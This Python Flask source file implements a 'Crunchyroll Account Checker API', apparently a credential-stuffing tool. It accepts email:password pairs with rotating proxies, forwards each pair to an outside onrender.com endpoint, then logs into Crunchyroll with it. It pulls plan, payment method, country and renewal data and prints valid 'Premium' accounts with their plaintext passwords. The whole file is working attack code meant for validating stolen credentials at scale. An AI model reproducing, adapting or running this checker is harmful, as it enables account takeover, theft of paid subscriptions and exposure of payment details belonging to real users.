import requests
from flask import Flask, request, Response, jsonify
from datetime import datetime
import pytz

EXTERNAL_API = "https://crunchyroll-q9ix.onrender.com/check"
LODA = "bm9haWhkZXZtXzZpeWcwYThsMHE6"

app = Flask(__name__)

def fetch_crunchy_details(email, password, proxy=None):
    session = requests.Session()
    if proxy:
        # Support both user:pass@host:port and host:port:user:pass
        parts = proxy.split(":")
        if len(parts) == 4:
            host, port, user, pwd = parts
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        else:
            proxy_url = "http://" + proxy
        session.proxies = {"http": proxy_url, "https": proxy_url}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    try:
        r = session.get("https://www.crunchyroll.com/", headers=headers, timeout=30)
        if r.status_code != 200:
            return None
        # Login step
        login_headers = {
            "Host": "sso.crunchyroll.com",
            "User-Agent": headers["User-Agent"],
            "Accept": "*/*",
            "Referer": "https://sso.crunchyroll.com/login",
            "Origin": "https://sso.crunchyroll.com",
            "Content-Type": "text/plain;charset=UTF-8",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }
        login_json = {
            "email": email,
            "password": password,
            "eventSettings": {}
        }
        login_res = session.post(
            "https://sso.crunchyroll.com/api/login",
            json=login_json,
            headers=login_headers,
            timeout=30
        )
        if "invalid_credentials" in login_res.text or login_res.status_code != 200:
            return None
        device_id = session.cookies.get("device_id")
        if not device_id:
            return None
        token_headers = {
            "Host": "www.crunchyroll.com",
            "User-Agent": headers["User-Agent"],
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": f"Basic {LODA}",
            "Origin": "https://www.crunchyroll.com",
            "Referer": "https://www.crunchyroll.com/"
        }
        token_data = {
            "device_id": device_id,
            "device_type": "Firefox on Windows",
            "grant_type": "etp_rt_cookie"
        }
        token_res = session.post(
            "https://www.crunchyroll.com/auth/v1/token",
            data=token_data,
            headers=token_headers,
            timeout=30
        )
        if token_res.status_code != 200:
            return None
        js = token_res.json()
        token = js.get("access_token")
        account_id = js.get("account_id")
        if not (token and account_id):
            return None
        subs_headers = {
            "Host": "www.crunchyroll.com",
            "User-Agent": headers["User-Agent"],
            "Accept": "application/json, text/plain, */*",
            "Authorization": f"Bearer {token}",
            "Referer": "https://www.crunchyroll.com/account/membership"
        }
        subs_res = session.get(
            f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
            headers=subs_headers,
            timeout=30
        )
        if subs_res.status_code != 200:
            return None
        data = subs_res.json()
        if data.get("containerType") == "free":
            return {
                "email": email,
                "pass": password,
                "country": None,
                "plan": "Free",
                "payment_method": None,
                "trial": False,
                "account_status": None,
                "renewal": None,
                "days_left": 0
            }
        subscriptions = data.get("subscriptions", [])
        plan_text = plan_value = active_free_trial = next_renewal_date = status = "None"
        if subscriptions:
            plan = subscriptions[0].get("plan", {})
            tier = plan.get("tier", {})
            plan_text = tier.get("text") or plan.get("name", {}).get("text") or plan.get("name", {}).get("value") or "None"
            plan_value = tier.get("value") or plan.get("name", {}).get("value") or "None"
            active_free_trial = str(subscriptions[0].get("activeFreeTrial", False)).capitalize()
            next_renewal_date = subscriptions[0].get("nextRenewalDate", "None")
            status = subscriptions[0].get("status", "None")
        payment = data.get("currentPaymentMethod", {})
        payment_info = payment.get("name", "None") if payment else "None"
        payment_method_type = payment.get("paymentMethodType", "None") if payment else "None"
        country_code = payment.get("countryCode", "None") if payment else "None"
        # Renewal/expiry and days left
        if next_renewal_date not in ["N/A", "None"]:
            renewal_dt = datetime.strptime(next_renewal_date, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
            formatted_renewal_date = renewal_dt.strftime("%d-%m-%Y")
            ist = pytz.timezone("Asia/Kolkata")
            current_dt = datetime.now(ist)
            days_left = (renewal_dt.astimezone(ist) - current_dt).days
            if days_left < 0:
                days_left = 0
        else:
            formatted_renewal_date = next_renewal_date
            days_left = 0
        plan_info = f"{plan_text}—{plan_value}"
        return {
            "email": email,
            "pass": password,
            "country": country_code,
            "plan": plan_info,
            "payment_method": f"{payment_info} ({payment_method_type})",
            "trial": active_free_trial,
            "account_status": status,
            "renewal": formatted_renewal_date,
            "days_left": days_left
        }
    except Exception as e:
        return None

def format_text(data):
    return (
        f"✅ Premium Account\n\n"
        f"Account: {data.get('email','')}:{data.get('pass','')}\n"
        f"Country: {data.get('country', 'N/A')}\n"
        f"Plan: {data.get('plan', 'N/A')}\n"
        f"Payment: {data.get('payment_method', 'N/A')}\n"
        f"Trial: {data.get('trial', 'False')}\n"
        f"Status: {data.get('account_status', 'N/A')}\n"
        f"Renewal: {data.get('renewal', 'N/A')}\n"
        f"Days Left: {data.get('days_left', '0')}\n"
    )

@app.route('/check', methods=['GET'])
def check():
    emailpass = request.args.get("email")
    proxy = request.args.get("proxy")
    if not emailpass or ":" not in emailpass:
        return jsonify({"status": "error", "message": "Usage: /check?email=email:pass&proxy=ip:port:user:pass"}), 400
    params = {"email": emailpass}
    if proxy:
        params["proxy"] = proxy
    # 1. Call the external API for login
    try:
        api_resp = requests.get(EXTERNAL_API, params=params, timeout=60)
        api_data = api_resp.json()
    except Exception as e:
        return jsonify({"status": "error", "message": f"External API Error: {e}"})
    # 2. If hit, fetch details from script
    if (api_data.get("message", "").lower().startswith("premium") or api_data.get("status") in ("premium", "success", "hit")):
        email, password = emailpass.split(":", 1)
        details = fetch_crunchy_details(email, password, proxy)
        if details:
            return Response(format_text(details), mimetype="text/plain")
        else:
            return jsonify({"status": "error", "message": "Failed to fetch Crunchyroll details"})
    else:
        return jsonify(api_data)

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        "message": "Crunchyroll Account Checker API (Login via API, details via script)",
        "usage": "/check?email=email:pass&proxy=ip:port:user:pass"
    })

if __name__ == "__main__":
    app.run("0.0.0.0", 5000, debug=True)
